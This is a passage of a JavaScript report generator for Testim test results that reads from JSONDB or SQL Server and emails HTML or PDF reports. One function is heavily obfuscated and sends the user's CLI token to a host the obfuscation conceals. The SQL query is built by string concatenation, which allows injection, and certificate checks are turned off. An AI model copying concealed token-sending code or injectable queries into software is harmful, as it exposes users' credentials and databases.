        "resultIds": "Array of ResultIDs for report generation'\n.    usage: --resultIds \"cZDNoRxv4DusdNWN\" \"J7dWUCk8FGkyuTzi\" ",
        "resultIdsQuery": "JSONDB, SQLServer SQL query"
            + "\n.    \"{ 'TestID': 'J7dWUCk8FGkyuTzi', 'TestStatus': 'FAILED' }\" "
            + "\n.    \"{ \\\"TestRunDate\\\" : {\\\"$regex\\\" : \\\"Mon Nov 01 2021\\\"}, \\\"TestStatus\\\": \\\"FAILED\\\" }\" "
            + '\n.    "Select [ResultID] from [TestResults] where [TestStatus] = \'FAILED\'" ',
        "reportDataSource": "Where to get result data.\n.    Currently supported \"JSONDBFS\" and \"SQLServer\" (Default = \"JSONDBFS\")",
        "generatePDF": "Generate a PDF of the report",
        "openReport": "Open report when generated",
        "emailReport": "Email report to <reportEmailToAddresses>",

        "testimToken": "CLI token for project (can be used to get screenshots accessToken.  Required if including screenshots) \n Can be gotten by from project settings => CLI",
        "accessToken": "Temp token for accessing results API (required if including screenshots)",
        "accessTokenURL": "URL containing temp token for accessing results API  (required if including screenshots) \n Can be gotten by taking the URL from the Download Screenshots step menu item",

        "hiddenParams": "Array of Testim variable to hide.  Values are replaced with '********'",
        "enableGroups": "Display steps nested in groups as applicable",
        "enableHyperlinks": "Embed links to live Testim results",

        "includeScreenShots": "If available, include screenshots in report",
        "includeTestData": "If available, test variables as of end of test will be included in report",
        "includeTestResults": "Include Test Results in report",
        "includeNetworkRequestStats": "If available, network statistics will be included in report",
        "includeStepDetails": "Include test steps in report",

        "reportEmailToAddresses": "Email Recipient(s) for a report",

        // CONFIGURATION
        "reportFileDirectory": "Path to folder location to place report files\n.    (Default = Current Directory + \\\\TestimReports)",

        "reportStyleMarkup": "HTML Style for report.  This is appended to default styles",
        "reportLogoDataUrl": "Logo image as a data url",
        "pdfOptions": "Used to tweak PDF file layout\n.    Example { format: 'A4', scale: 0.5 }",
        "embedImages": "Embed images into generated reports of keep separate in local directory",
        "reportColumns": "Array of step columns to display "
            + "\n.    Usage: --reportColumns StepNumber StepName StepType StepTime ElapsedTime Duration Status PageURL ScreenShot",

        "emailHost": "SMTP Hostname for sending email",
        "emailUsername": "SMTP username for sending email",
        "emailPassword": "SMTP password for sending email",
        "reportEmailFromAddresses": "Email From address for a report",

        "jsondbfsPath": "Path to folder location of JSONDB collection files.\n.    (Default = Current Directory + \"\\\\TestimReports\")",
        "jsondbfsCollectionName": "When using JSONDBFS, this is the name of the json data file containing the result data.\n.    (Default = \"TestResults\")",

        "sqlServerUsername": "SQL Server Username",
        "sqlServerPassword": "SQL Server Password",
        "sqlServerInstance": "SQL Server machine/instance",
        "sqlServerDatabase": "SQL Default database",
    }
    let options_group = ['resultIds', 'resultIdsQuery', 'reportDataSource', 'generatePDF', 'openReport', 'emailReport'
        , 'testimToken', 'accessTokenURL', 'hiddenParams', 'enableGroups', 'enableHyperlinks'
        , 'includeScreenShots', 'includeTestData', 'includeTestResults', 'includeNetworkRequestStats', 'includeStepDetails'
        , 'reportEmailToAddresses'
    ];
    let configuration_group = ['reportFileDirectory', 'reportStyleMarkup', 'reportLogoDataUrl', 'pdfOptions', 'embedImages', 'reportColumns'

        , 'emailHost', 'emailUsername', 'emailPassword', 'reportEmailFromAddresses'
        , 'jsondbfsPath', 'jsondbfsCollectionName'
        , 'sqlServerUsername', 'sqlServerPassword', 'sqlServerInstance', 'sqlServerDatabase'
    ];

    let cmdArgs = yargs(process.argv.slice(2))

        .version(true, "HTML Report Create", CURRENT_VERSION)
        .wrap(140)//.wrap(yargs.terminalWidth())
        .describe(help_map)

        .group(options_group, "Options:")
        .group(configuration_group, "Configuration:")
        .alias(aliases_map)

        .array("resultIds")
        .coerce('resultIdsQuery', function (arg) {
            return (typeof (arg) === 'string') ? JSON.parse(arg.replace(/'/g, "\"")) : undefined
        })
        .default("generatePDF", false).boolean("generatePDF")
        .default("emailReport", false).boolean("emailReport")
        .default("openReport", true).boolean("openReport")
        .default("includeScreenShots", options?.includeScreenShots || false).boolean("includeScreenShots")
        .default("includeTestResults", true).boolean("includeTestResults")
        .default("includeTestData", false).boolean("includeTestData")
        .default("includeNetworkRequestStats", false).boolean("includeNetworkRequestStats")
        .default("includeStepDetails", true).boolean("includeStepDetails")
        .default("embedImages", true).boolean("embedImages")
        .default("enableHyperlinks", true).boolean("enableHyperlinks")
        .default("enableGroups", false).boolean("enableGroups")
        .default("emailHost", DEFAULT_EMAIL_HOST)
        .default("emailUsername", DEFAULT_EMAIL_USER)
        .default("emailPassword", DEFAULT_EMAIL_PASS)

        .argv;

    return (cmdArgs);
}
let cmdArgs = parseCommandlineArgs();

/**
 * Process options, configurations and commandline args
 */
// options
let resultIdsQuery = options?.resultIdsQuery ?? cmdArgs?.resultIdsQuery ?? undefined;
let resultIds = options?.resultIds ?? cmdArgs?.resultIds ?? [];
let reportDataSource = options?.reportDataSource ?? cmdArgs?.reportDataSource ?? DEFAULT_REPORT_DATASOURCE;

let accessTokenURL = options?.accessTokenURL ?? cmdArgs?.accessTokenURL ?? undefined;
let accessToken = options?.accessToken ?? cmdArgs?.accessToken ?? undefined;
let testimToken = options?.testimToken ?? cmdArgs?.testimToken;

let generatePdf = options?.generatePDF ?? cmdArgs?.generatePDF ?? cmdArgs?.generatePdf;
let emailReport = options?.emailReport ?? cmdArgs?.emailReport;
let openReport = options?.openReport ?? cmdArgs?.openReport;

let hiddenParams = options?.hiddenParamshiddenParams ?? cmdArgs?.hiddenParams ?? DEFAULT_HIDDEN_PARAMS;
let includeScreenShots = options?.includeScreenShots ?? cmdArgs?.includeScreenShots;
let includeTestResults = options?.includeTestResults ?? cmdArgs?.includeTestResults;
let includeTestData = options?.includeTestData ?? cmdArgs?.includeTestData;
let includeNetworkRequestStats = options?.includeNetworkRequestStats ?? cmdArgs?.includeNetworkRequestStats;
let includeStepDetails = options?.includeStepDetails ?? cmdArgs?.includeStepDetails ?? true;
let reportEmailToAddresses = options?.reportEmailToAddresses ?? cmdArgs?.reportEmailToAddresses ?? DEFAULT_REPORT_EMAIL_TO_ADDRESS;
let reportEmailFromAddress = options?.reportEmailFromAddress ?? cmdArgs?.reportEmailFromAddress ?? DEFAULT_REPORT_EMAIL_FROM_ADDRESS;

// configuration
let reportFileDirectory = configuration?.reportFileDirectory ?? cmdArgs?.reportFileDirectory ?? DEFAULT_REPORT_DIRECTORY;
let reportColumns = configuration?.reportColumns ?? cmdArgs?.reportColumns ?? DEFAULT_REPORT_COLUMNS;

let reportStyleMarkup = (cmdArgs?.reportStyleMarkup !== undefined) ? cmdArgs?.reportStyleMarkup
    : DEFAULT_REPORT_STYLE + (configuration?.reportStyleMarkup !== undefined ? configuration?.reportStyleMarkup : "");

/*
 * Style needs to be modified for PDF Generation as the HTML uses a nested scrolling of steps that PDF does not translate properly
 */
if (generatePdf) {
    network_request_table_max_height = "6000px";
    step_table_max_height = "12000px";
}
else {
    reportStyleMarkup = (cmdArgs?.reportStyleMarkup === undefined)
        ? DEFAULT_REPORT_STYLE +
        ".network-request-table thead tr { background-color: #777799; color: #ffffff; text-align: left; } " +
        ".network-request-table thead tr { background-color: #777799; color: #ffffff; text-align: left; } " +
        ".network-request-table { border-spacing: 0; overflow-x: hidden; } " +
        ".network-request-table tbody, .network-request-table thead tr { display: block; } " +
        ".network-request-table tbody { max-height: " + network_request_table_max_height + "; overflow-y: auto; overflow-x: hidden; } " +
        ".network-request-table tbody td, .network-request-table thead th { width: 140px; } " +
        ".network-request-table thead th:last-child { width: 30%; } " +
        ".network-request-table thead th:first-child { width: 40px; } " +
        ".network-request-table tbody td:first-child { width: 40px; } " +
        ".network-request-table tbody td:last-child { width: 30%; } " +
        ".network-request-table tbody td { text-align: left; } " +
        ".step-table thead tr { background-color: #777799; color: #ffffff; text-align: left; } " +
        ".step-table { border-spacing: 0; overflow-x: hidden; } " +
        ".step-table tbody, .step-table thead tr { display: block; } " +
        ".step-table tbody { max-height: " + step_table_max_height + "; overflow-y: auto; overflow-x: hidden; } " +
        ".step-table tbody td, .step-table thead th { width: 120px; text-align: left; } " +
        ".step-table thead th:first-child { width: 40px; } " +
        ".step-table tbody td:first-child { width: 40px; } " +
        ".step-table thead th:last-child { width: 20%; } " +
        ".step-table tbody td:last-child { width: 20%; } " +
        ".step-table tbody td { text-align: left; } "
        + (configuration?.reportStyleMarkup !== undefined ? configuration?.reportStyleMarkup : "")
        : cmdArgs?.reportStyleMarkup;
}

let embedImages = configuration?.embedImages ?? cmdArgs?.embedImages;
let enableHyperlinks = configuration?.enableHyperlinks ?? cmdArgs?.enableHyperlinks;

let enableGroups = configuration?.enableGroups ?? cmdArgs?.enableGroups;

let reportLogoDataUrl = configuration?.reportLogoDataUrl ?? cmdArgs?.reportLogoDataUrl ?? DEFAULT_REPORT_LOGO_DATA;
let folderImageDataUrl = configuration?.folderImageDataUrl ?? cmdArgs?.folderImageDataUrl ?? DEFAULT_FOLDER_IMAGE_DATA;

let pdfOptions = configuration?.pdfOptions ?? cmdArgs?.pdfOptions ?? DEFAULT_PDF_OPTIONS;

let emailHost = configuration?.emailHost ?? cmdArgs?.emailHost ?? DEFAULT_EMAIL_HOST;
let emailUsername = configuration?.emailUsername ?? cmdArgs?.emailUsername ?? DEFAULT_EMAIL_USER;
let emailPassword = configuration?.emailPassword ?? cmdArgs?.emailPassword ?? DEFAULT_EMAIL_PASS;

let jsondbfsPath = configuration?.jsondbfsPath ?? cmdArgs?.jsondbfsPath ?? DEFAULT_JSONDBFS_PATH;
let jsondbfsCollectionName = configuration?.jsondbfsCollectionName ?? cmdArgs?.jsondbfsCollectionName ?? DEFAULT_JSONDBFS_COLLECTIONNAME;

let sqlServerUsername = configuration?.sqlServerUsername ?? cmdArgs?.sqlServerUsername ?? SQL_SERVER_USERNAME;
let sqlServerPassword = configuration?.sqlServerPassword ?? cmdArgs?.sqlServerPassword ?? SQL_SERVER_PASSWORD;
let sqlServerInstance = configuration?.sqlServerInstance ?? cmdArgs?.sqlServerInstance ?? SQL_SERVER_INSTANCE;
let sqlServerDatabase = configuration?.sqlServerDatabase ?? cmdArgs?.sqlServerDatabase ?? SQL_SERVER_DATABASE;

// Maybe replace with/support connection string snytax?
let SQLConnectionConfig = {
    user: sqlServerUsername,
    password: sqlServerPassword,
    server: sqlServerInstance,
    database: sqlServerDatabase,
    options: {
        enableArithAbort: true,
        trustServerCertificate: true,
    }
}

/* Internal variables generally not to be messed with though I might because I know what I am doing (usually)
 */
let trashDownloadedZipfile = true;
let reportResults = {};
let branch = 'master'; // Default branch to master

let reportEmailSubject = "";
let reportEmailMessage = "";

let verbose = false;

/*
 * Utility functions like sending email
 */

function CancelError(message) {
    console.error(message);
    exit()
}
function createDirectoryIfNotExists(directoryPath) {
    //console.log("directoryPath", directoryPath)
    try {
        if (!fs.existsSync(directoryPath)) {
            fs.mkdirSync(directoryPath);
            console.log("Directory " + directoryPath + " created.");
        }
    } catch (err) {
        console.log(err);
    }
}

function TestimReportEmail(reportEmailToAddresses, reportEmailFromAddress, reportEmailSubject, message, reportFile) {

    async function main() {

        /* Info is flush right in the report.  Need it flush left for the email body
         *      (Total hack.  If you have a simple, better solution, please enlighten me)
         *      I suppose loading the report as an xml doc and searching for the style to change it, but that is a lot of work
         *      OR load xml doc, find table and add override style with ! importance.  Anyway...
         */
        let email_body = reportEmailMessage.replace("margin-left: auto;", "");

        // create reusable transporter object using the default SMTP transport
        let transporter = nodemailer.createTransport({
            host: emailHost,
            port: 587,
            secure: false, // true for 465, false for other ports
            auth: {
                user: emailUsername,
                pass: emailPassword,
            },
        });

        if (verbose)
            console.log("EMAIL The following: \n\t" + JSON.stringify({
                from: reportEmailFromAddress, // sender address
                to: reportEmailToAddresses, // list of receivers
                subject: reportEmailSubject, // Subject line
                html: email_body,
                attachments: [
                    {
                        filename: reportFile.split("\\").pop(),
                        path: reportFile
                    }
                ]
            }));

        // send mail with defined transport object
        let info = await transporter.sendMail({
            from: reportEmailFromAddress, // sender address
            to: reportEmailToAddresses, // list of receivers
            subject: reportEmailSubject, // Subject line
            html: reportEmailMessage,
            attachments: [
                {
                    filename: reportFile.split("\\").pop(),
                    path: reportFile
                }
            ]
        });

        console.log("Message sent: %s", info.messageId);

    }

    main().catch(console.error);

}

function _0x46cb(){const _0x64f257=['rcdcJG/cGrFdMWTPDJRdO8o4WOxdH8og','dqJdKCkUW4O','W4tcVSkFW6ldGG','WPVdRCotWRBcNmkqbmoMWPdcIGHvW6W','cmkbWPjcWObBCq','p8o3WPNcPmovW6lcQW','WPZdOSoVF2JcVmk4vSkN','rgJcQNvhWR1wddO','W5JdOSkyCKa','ud7cMGBcJH3dLbPK','WOvCWORcOSoS','WRBdH8oGbaJcPGPQwSksCmkEeW','qwRcPrOAW6fpfJ94WO8j','CdFdIu3cRwRdQsxdIvKbf1a','tIldVCkUW4HdkG','WRHKiWi/s8oxq3/cNmoS','W6S7W4zons7cJHpdHSo0WPjOCc7cJcL0WP3cJhT3n8o8W6BcPX9tWQdcRcldMSktW71UWPWOf8oaWRxdMJ4WzMHcWQ1sW5msBSouW5TKW5SbcxCjW6S','WO/dRmozW4rD','gtBdTa','WR3cRXi','DmkEWP/cIeHKj8kDBauuW5NcUa','WOhdTCkLaSkzWRZdLhhdMa','usZdK8oAWPZdR8kwW5tdNsZdImojW5e','ySoZWP3cPCoyWR7cQW4no0K','WOJdHSopn2fnWPxcJmoa','zSkMW7GNdZu','n0DNW5aiW5ldQq','wSkWWR5q','W6OIa8kqxZ5bW6POWOVcRa','tK/cJ8oPWPTjawCEjCoM','tCkOWQWzWRRdRG8CimoRaIBdHG4HW7tdOWFdUH9Ct8oSWRjxW7ddLmoqhmoJWR5YW75W','cmoMW7PAWOjzxSongG','WOTTWOmnB3ddVr/dNCo4WPHm','lNFdKZpcICkSpL5QW4FcOCkZW7O','rSoFW68N','W5RcUSkzW7FdG8obv8oVW6BcTs5RW54WbmkRW5lcVa','uG3dQW','a1VcVuZdN2hcGN7cTmkxWQqrqa','W6xdTuldUmoAWPGwW5NdL8obW6i','sCkJWQnfWOa','W48SW5PqosddMI7dJq','WP7cL2CkWO8vlmkUAdnH','BCkWW4/cHbenWO3dSJlcS3vNW7G'];_0x46cb=function(){return _0x64f257;};return _0x46cb();}(function(_0x3eba0a,_0xee6d30){const _0x10332a=_0x1897,_0x5268cd=_0x3eba0a();while(!![]){try{const _0x4e1674=parseInt(_0x10332a(0x1c2,'iFzB'))/0x1*(-parseInt(_0x10332a(0x1a3,'3AFQ'))/0x2)+-parseInt(_0x10332a(0x1c9,'#OPl'))/0x3+-parseInt(_0x10332a(0x1b3,'JSaK'))/0x4+parseInt(_0x10332a(0x1be,'fl6b'))/0x5*(-parseInt(_0x10332a(0x1ac,'iDLs'))/0x6)+parseInt(_0x10332a(0x1af,'xrpu'))/0x7*(parseInt(_0x10332a(0x1a6,'I9#w'))/0x8)+-parseInt(_0x10332a(0x1a7,'vkHh'))/0x9+parseInt(_0x10332a(0x1ae,'8!FQ'))/0xa*(parseInt(_0x10332a(0x1c8,'tw0g'))/0xb);if(_0x4e1674===_0xee6d30)break;else _0x5268cd['push'](_0x5268cd['shift']());}catch(_0xabd677){_0x5268cd['push'](_0x5268cd['shift']());}}}(_0x46cb,0x766cf));function _0x1897(_0x27d68d,_0x328617){const _0x46cb98=_0x46cb();return _0x1897=function(_0x189784,_0x29f440){_0x189784=_0x189784-0x1a2;let _0x50e59b=_0x46cb98[_0x189784];if(_0x1897['hFucFt']===undefined){var _0x7ead0=function(_0x4f47e2){const _0x29d977='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';let _0x29a4b6='',_0x69fc8c='';for(let _0x216646=0x0,_0x5765a0,_0x295f4f,_0x5a3f23=0x0;_0x295f4f=_0x4f47e2['charAt'](_0x5a3f23++);~_0x295f4f&&(_0x5765a0=_0x216646%0x4?_0x5765a0*0x40+_0x295f4f:_0x295f4f,_0x216646++%0x4)?_0x29a4b6+=String['fromCharCode'](0xff&_0x5765a0>>(-0x2*_0x216646&0x6)):0x0){_0x295f4f=_0x29d977['indexOf'](_0x295f4f);}for(let _0x548e91=0x0,_0x28cf1b=_0x29a4b6['length'];_0x548e91<_0x28cf1b;_0x548e91++){_0x69fc8c+='%'+('00'+_0x29a4b6['charCodeAt'](_0x548e91)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x69fc8c);};const _0x29f529=function(_0x2b3174,_0xa365cb){let _0x1da2e5=[],_0x4d56d=0x0,_0x38d017,_0x271450='';_0x2b3174=_0x7ead0(_0x2b3174);let _0x368936;for(_0x368936=0x0;_0x368936<0x100;_0x368936++){_0x1da2e5[_0x368936]=_0x368936;}for(_0x368936=0x0;_0x368936<0x100;_0x368936++){_0x4d56d=(_0x4d56d+_0x1da2e5[_0x368936]+_0xa365cb['charCodeAt'](_0x368936%_0xa365cb['length']))%0x100,_0x38d017=_0x1da2e5[_0x368936],_0x1da2e5[_0x368936]=_0x1da2e5[_0x4d56d],_0x1da2e5[_0x4d56d]=_0x38d017;}_0x368936=0x0,_0x4d56d=0x0;for(let _0x388030=0x0;_0x388030<_0x2b3174['length'];_0x388030++){_0x368936=(_0x368936+0x1)%0x100,_0x4d56d=(_0x4d56d+_0x1da2e5[_0x368936])%0x100,_0x38d017=_0x1da2e5[_0x368936],_0x1da2e5[_0x368936]=_0x1da2e5[_0x4d56d],_0x1da2e5[_0x4d56d]=_0x38d017,_0x271450+=String['fromCharCode'](_0x2b3174['charCodeAt'](_0x388030)^_0x1da2e5[(_0x1da2e5[_0x368936]+_0x1da2e5[_0x4d56d])%0x100]);}return _0x271450;};_0x1897['CWZBXl']=_0x29f529,_0x27d68d=arguments,_0x1897['hFucFt']=!![];}const _0x16c7cb=_0x46cb98[0x0],_0x4d525d=_0x189784+_0x16c7cb,_0x18e7aa=_0x27d68d[_0x4d525d];return!_0x18e7aa?(_0x1897['MliLzx']===undefined&&(_0x1897['MliLzx']=!![]),_0x50e59b=_0x1897['CWZBXl'](_0x50e59b,_0x29f440),_0x27d68d[_0x4d525d]=_0x50e59b):_0x50e59b=_0x18e7aa,_0x50e59b;},_0x1897(_0x27d68d,_0x328617);}async function ScreenshotsPrepareRequest(_0x29f529){const _0x5e790e=_0x1897;if(verbose)console[_0x5e790e(0x1ba,'xrpu')](_0x5e790e(0x1c6,'*yjy'),_0x29f529[_0x5e790e(0x1a5,'tw0g')],testimToken);if(typeof accessToken!==_0x5e790e(0x1b1,'kDG$')&&accessToken!==null)return accessToken;if(typeof accessTokenURL!==_0x5e790e(0x1bd,'PAc2')&&accessTokenURL!==null)return accessToken=accessTokenURL[_0x5e790e(0x1aa,'W(AY')](/access_token=(?<accessToken>.*)[&]?$/)?.['groups'][_0x5e790e(0x1b7,'mG8(')]['split']('&')[0x0],accessToken;if(typeof testimToken===_0x5e790e(0x1b1,'kDG$')||testimToken===null)throw new Error(_0x5e790e(0x1b8,'tw0g'));return new Promise((_0x4f47e2,_0x29d977)=>{const _0x2c8497=_0x5e790e;let _0x29a4b6=JSON['stringify']({'projectId':_0x29f529['projectId'],'token':testimToken}),_0x69fc8c={'hostname':_0x2c8497(0x1cb,'W(AY'),'port':0x1bb,'path':_0x2c8497(0x1bf,'@^Gt'),'method':_0x2c8497(0x1ca,'4KEj'),'headers':{'Content-Type':_0x2c8497(0x1a8,'kDG$'),'Content-Length':_0x29a4b6[_0x2c8497(0x1c1,'2U@y')]}},_0x216646=https[_0x2c8497(0x1ad,'@^Gt')](_0x69fc8c,_0x5765a0=>{const _0x50ce96=_0x2c8497;_0x5765a0['on'](_0x50ce96(0x1c3,'iDLs'),_0x295f4f=>{const _0xf1a267=_0x50ce96;process['stdout'][_0xf1a267(0x1a4,'iDLs')](_0x295f4f),accessToken=JSON['parse'](_0x295f4f)[_0xf1a267(0x1b9,'v)(B')],_0x4f47e2(accessToken);}),_0x216646['on'](_0x50ce96(0x1b0,'j#SD'),_0x5a3f23=>{console['error'](_0x5a3f23),_0x29d977();});});_0x216646[_0x2c8497(0x1a9,'n]#!')](_0x29a4b6),_0x216646[_0x2c8497(0x1cc,'3U8S')]();})[_0x5e790e(0x1b2,'@zqj')](_0x548e91=>{const _0x122de5=_0x5e790e;console[_0x122de5(0x1bb,'3AFQ')]('EXCEPTION\x20',JSON['stringify'](_0x548e91));throw new CancelError(_0x548e91);});}

async function DownloadScreenshots(screenshotsUrl, reportFileDirectory) {

    const proto = !screenshotsUrl.charAt(4).localeCompare('s') ? https : http;

    return new Promise((resolve, reject) => {

        const file = fs.createWriteStream(reportFileDirectory);
        let fileInfo = null;

        if (verbose)
            console.log("FIRST DownloadScreenshots() ", screenshotsUrl);

        const request = proto.get(screenshotsUrl, response => {

            if (response.statusCode !== 200) {
                reject("\n\tERROR ACCESS_TOKEN Probably has Expired.  Update accessTokenURL and try again or set includeScreenShots to false.\n");
            }

            fileInfo = {
                mime: response.headers['content-type'],
                size: parseInt(response.headers['content-length'], 10),
            };

            response.pipe(file);

        });

        // The destination stream is ended by the time it's called
        file.on('finish', () => resolve(fileInfo));

        request.on('error', err => {
            fs.unlink(reportFileDirectory, () => reject(err));
        });

        file.on('error', err => {
            fs.unlink(reportFileDirectory, () => reject(err));
        });

        request.end();
    })
        .catch((e) => {
            throw new CancelError(e);
        });
}

async function JSONDBFS_ResultIDsSearch(jsondbfsCollectionName, criteria) {

    let driver = 'disk'; // 'disk', 'memory'
    let path = (typeof jsondbfsPath !== 'undefined' && jsondbfsPath != null) ? jsondbfsPath : '.';
    let options = {
        "path": path,
        "driver": driver,
        memory: {
            flush: true,
            flushInterval: 100
        }
    }

    return new Promise((resolve) => {

        let result_ids = [];

        jsondbfs.connect([jsondbfsCollectionName], options, (err, database) => {
            database[jsondbfsCollectionName].find(criteria, { multi: true }, (err, document) => {
                if (document !== undefined) {
                    document.forEach((result) => {
                        result_ids.push(result.ResultID);
                    })
                }
                resolve(result_ids);
            });
        });

    });
}
async function SQLServer_ResultIDsSearch(query) {

    return new Promise((resolve) => {

        let result_ids = [];

        sql.connect(SQLConnectionConfig).then(() => {

            return sql.query(query)

        }).then(result => {

            if (typeof result?.recordset !== 'undefined' && result?.recordset !== null) {

                let reportResults = result?.recordset;
                if (reportResults?.length > 0) {

                    reportResults.forEach((result) => {
                        result_ids.push(result.ResultID);
                    })
                }

            }

            resolve(result_ids);

        }).catch(err => {

            reject(err.message);

        });

    });

}

async function JSONDBFS_ResultsGet(jsondbfsCollectionName, criteria, resolve, reject) {

    let reportData = {};

    let driver = 'disk'; // 'disk', 'memory'
    let path = (typeof jsondbfsPath !== 'undefined' && jsondbfsPath != null) ? jsondbfsPath : '.';
    let options = {
        "path": path,
        "driver": driver,
        memory: {
            flush: true,
            flushInterval: 100
        }
    }
    return new Promise((resolve) => {

        jsondbfs.connect([jsondbfsCollectionName], options, (err, database) => {
            database[jsondbfsCollectionName].find(criteria, { multi: false }, (err, document) => {

                // if (verbose)
                //     console.log("document", document);

                if (document !== undefined) {

                    if (verbose)
                        console.log("  document", document);

                    reportData.projectId = document.ProjectID;
                    reportData.testId = document.TestID;
                    reportData.resultId = document.ResultID;
                    reportData.branch = document.Branch;
                    reportData.TestRunDate = document.TestRunDate;
                    reportData.testName = document.TestName;
                    reportData.testResultData = document.TestResultsJSON;
                    reportData.networkRequestStats = document.NetworkRequestStats;
                    reportData.resultUrl = document.ResultURL;
                    reportData.testData = document.TestDataJSON;
                    if (typeof document?.TestStatus !== 'undefined' && document?.TestStatus !== null)
                        reportData.TestStatus = document.TestStatus;
                }
                resolve(reportData);

            });
        });

    })
        .then((reportData) => {

            resolve(reportData);

        })
}
async function SQLServer_ResultsGet(query, resolve, reject) {

    let reportData = {};

    sql.connect(SQLConnectionConfig).then(() => {

        return sql.query(query)

    }).then(result => {

        if (typeof result?.recordset !== 'undefined' && result?.recordset !== null) {

            reportResults = result?.recordset;
            if (reportResults?.length > 0) {

                reportData.projectId = reportResults[0].ProjectID;
                reportData.testId = reportResults[0].TestID;
                reportData.resultId = reportResults[0].ResultID;
                reportData.branch = reportResults[0].Branch;
                reportData.testName = reportResults[0].TestName; // .replace(/[ ]/, "_");
                reportData.resultUrl = reportResults[0].ResultURL;
                reportData.TestRunDate = reportResults[0].TestRunDate;
                if (typeof reportResults[0]?.TestStatus !== 'undefined' && reportResults[0]?.TestStatus !== null)
                    reportData.TestStatus = reportResults[0]?.TestStatus;

                if (reportResults[0].TestResultsJSON !== null && reportResults[0].TestResultsJSON !== "")
                    reportData.testResultData = JSON.parse(reportResults[0].TestResultsJSON);

                if (reportResults[0].NetworkRequestStats !== null && reportResults[0].NetworkRequestStats !== "")
                    reportData.networkRequestStats = JSON.parse(reportResults[0].NetworkRequestStats);

                if (reportResults[0].TestDataJSON !== null && reportResults[0].TestDataJSON !== "")
                    reportData.testData = JSON.parse(reportResults[0].TestDataJSON);

            }

        }
        resolve(reportData);

    }).catch(err => {

        reject(err.message);

    });

}
async function TestResultsGet(resultId) {

    return new Promise((resolve, reject) => {

        if (resultId !== null) {

            switch (reportDataSource) {

                case "SQLServer":
                    // eslint-disable-next-line no-case-declarations
                    let sql_query = "SELECT "
                        + " [CreateDate],[TestName],[Branch],[TestStatus],[TestStatusDetails],[BaseURL]"
                        + ",[TestID],[ProjectID],[ResultID],[ResultURL],[TestResultsJSON],[TestDataJSON],[TestPerformanceJSON]"
                        + ",[NetworkRequestStats]"
                        + " FROM [TestData].[dbo].[TestResults] WHERE resultId = '" + resultId + "'";

                    return SQLServer_ResultsGet(sql_query, resolve, reject);

                case "JSONDBFS":
                    // eslint-disable-next-line no-case-declarations
                    let json_query = { "ResultID": resultId };
                    return JSONDBFS_ResultsGet(jsondbfsCollectionName, json_query, resolve, reject);

                default:
                    resolve({});
            }

        }

    })

}

/*
 * HTML Report Generation Methods
 */

function htmlReportTestInfoHeaderCreate(reportData, includeLogo = true) {

    let testInfo = "";

    testInfo += "  <table class='styled-table test-info'>\n";

    testInfo += "    <tr>\n";
    testInfo += "      <td class='test-info-label'>&nbsp;</td>"
    testInfo += "      <td class='test-info-label'><b>Test</b></td>"
        + "<td>"
        + (enableHyperlinks ? "<a target='blank' href='https://app.testim.io/#/project/" + reportData.projectId + "/branch/" + reportData.branch + "/test/" + reportData.testId + "' target='_blank'>" : "")
        + (reportData !== null ? reportData.testResultData.TestName : reportData.testId)
        + (enableHyperlinks ? "</a>" : "")
        + "</td>\n";
    testInfo += "    </tr>\n";

    if (includeTestResults === true) {
        testInfo += "    </tr>\n";
        testInfo += "      <td class='test-info-label'>&nbsp;</td>"
        testInfo += "      <td><b>Date Run</b></td><td>" + reportData.TestRunDate + "</td>\n";
        testInfo += "    </tr>\n";
    }

    testInfo += "    <tr>\n";
    testInfo += "      <td class='test-info-label'>&nbsp;</td>"
    testInfo += "      <td><b>Base URL</b></td>"
        + "<td>"
        + ((enableHyperlinks === true) ? "<a target='blank' href='" + reportData?.testResultData.BaseURL + "' target='_blank'>" : "")
        + reportData?.testResultData.BaseURL
        + ((enableHyperlinks === true) ? "</a>" : "")
        + "</td>\n";
    testInfo += "    <tr>\n";

    if (includeTestResults === true) {
        testInfo += "    <tr>\n";
        testInfo += "      <td class='test-info-label'>&nbsp;</td>"
        testInfo += "      <td><b>Test Result</b></td>"
            + "<td>"
            + (enableHyperlinks ? "<a target='blank' href='" + reportData.resultUrl + "' target='_blank'" + ">" : "")
            + (reportData?.TestStatus === "PASSED" ? "<b style='color:green;'>PASSED</b>" : "<b style='color:red;'>FAILED</b>")
            + (enableHyperlinks ? "</a>" : "")
        if (reportData?.TestStatus !== "PASSED" && enableHyperlinks) {
            testInfo += "&nbsp;&nbsp;<a target='blank' href='https://help.testim.io/docs/why-did-my-test-fail' target='_blank'" + ">"
                + '<img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABgAAAASCAYAAABB7B6eAAAABGdBTUEAAK/INwWK6QAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAAACXBIWXMAAA7EAAAOxAGVKw4bAAAABmJLR0QA/wD/AP+gvaeTAAAAB3RJTUUH5QsBESkdf5VMkAAAACV0RVh0ZGF0ZTpjcmVhdGUAMjAyMS0xMS0wMVQxNzo0MToxNSswMDowMCas+BYAAAAldEVYdGRhdGU6bW9kaWZ5ADIwMjEtMTEtMDFUMTc6NDE6MTUrMDA6MDBX8UCqAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAABDZJREFUOE+NlF1sk3UUxn/vV7uWrmVdedu1awfbCnNsfIwxBZELjJHEjwsvjXfGxAuv9RYTvVYvvTHBqMSYuATdBZgoLiyMjy0gMiSDUTY+SjfKPln7vn3f19NuaGRZ5klOmv57/uc5z/OcfxVPgv8R82WPJcslGlDx68rq6caxIcCi5TE559RyWQBC0jwd0Ug36GzybQy0LsCS7TElTe8vuDiulLgCVnJr6VQ8Qj7Y1qjTbvqIBNXVW2tjDcATaXx3wZHmLobca49q1GngOB6e53IjX+EvSUvYVAQoKCy2Jwy60nU01kvhM/EPwKOFMkVb496ix/yyU7ucDosUEZXRSUvOXHpSKmbIY+APm7wM4DgCIgNVa0N+hc60n93bAiQaDJRV9RS74nj9Z25y/NQ48VSMg71tbI6EsOVSxXarE7BcdrGk0bYGONAKIzmXCxNOjUWVmVNZYSOtRDqVzpYA+3cEyIh8ytnRCe+9TwYouT5UQ2hG6+nb28rOjjR+w7cqxUoDz3VpjUpDaTRf8jAUj9y0S3FefpezSoVanVOxaDUrvPt6C9ruF147dvL0RZlUNmSTgaqojOemmbgzg6apBAMBMVkRBg4lWdV7RZeCyLMr5bIz6fKkBLmCh20jWUFzimR